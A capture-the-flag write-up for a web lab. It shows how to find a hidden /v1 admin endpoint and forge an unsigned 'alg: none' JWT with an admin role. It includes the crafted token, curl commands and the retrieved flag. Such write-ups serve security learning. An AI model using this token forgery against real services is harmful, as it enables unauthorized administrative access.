# Sokudo - Can you find API endpoints on a different path?

## Objective

Find the hidden API endpoint and retrieve the flag.

---

## 1. Inspect the Application

Open the target application and inspect its JavaScript files.

Use:

**Browser → Developer Tools → Sources**

or download the JavaScript and search through it.

Search for strings containing:

```text
/api
/admin
/flag
/v1
/v2
```

During JavaScript analysis, an interesting endpoint was discovered:

```text
/v2/admin/flag
```

---

## 2. Test the Discovered Endpoint

Send a request to:

```http
GET /v2/admin/flag
```

or:

```bash
curl -i https://lab-1789837962033-8pighs.labs-app.bugforge.io/v2/admin/flag
```

The application responds with:

```json
{
  "error": "Admin access required"
}
```

So the endpoint exists, but the current account does not have administrator privileges.

---

## 3. Inspect the Authorization Token

The request contained a JWT in the `Authorization` header:

```http
Authorization: Bearer <JWT>
```

Decoding the JWT payload showed:

```json
{
  "id": 4,
  "username": "fashil",
  "role": "user",
  "iat": 1789838125
}
```

The important field is:

```json
"role": "user"
```

The `/v2/admin/flag` endpoint therefore rejects the request because the token represents a normal user.

---

## 4. Use the Challenge Hint

The challenge description says:

> Can you find API endpoints on a different path?

The discovered endpoint uses:

```text
/v2/admin/flag
```

Therefore, investigate other API versions/paths.

Try:

```text
/v1/admin/flag
/v2/admin/flag
/V1/admin/flag
/V2/admin/flag
```

The important discovery is:

```text
/v1/admin/flag
```

---

## 5. Create an Administrative JWT

For the lab, construct a JWT containing an administrative role.

The header used was:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The payload was:

```json
{
  "id": 1,
  "username": "admin",
  "role": "admin",
  "iat": 1789838125
}
```

The resulting unsigned JWT was:

```JWT
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4OTgzODEyNX0.
```

> In a real application, accepting `alg: none` and trusting an attacker-controlled `role` claim would be a serious JWT authentication/authorization vulnerability.

---

## 6. Send the Request to the Alternative Endpoint

Use the crafted token against:

```http
GET /v1/admin/flag
```

Example:

```bash
curl -i \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4OTgzODEyNX0." \
  https://lab-1789837962033-8pighs.labs-app.bugforge.io/v1/admin/flag
```

The server responds:

```http
HTTP/2 200
```

with:

```json
{
  "flag": "bug{Ic7jW6vPmqBelPPe6hYxmJrPEgiDJAWg}"
}
```

---

## 7. Flag

```text
bug{Ic7jW6vPmqBelPPe6hYxmJrPEgiDJAWg}
```

## Attack Chain

```text
Obfuscated JavaScript
        ↓
Discover /v2/admin/flag
        ↓
Request returns "Admin access required"
        ↓
Inspect JWT
        ↓
JWT contains role=user
        ↓
Challenge hint says "different path"
        ↓
Test API version /v1/
        ↓
Discover /v1/admin/flag
        ↓
Craft admin JWT with alg=none
        ↓
Send Authorization header
        ↓
HTTP 200
        ↓
Retrieve flag
```

## Vulnerabilities Demonstrated

* Hidden API endpoint discovery
* API version/path enumeration
* JWT-based authorization
* Acceptance of unsigned JWTs (`alg: none`)
* Trusting a client-controlled administrative role claim
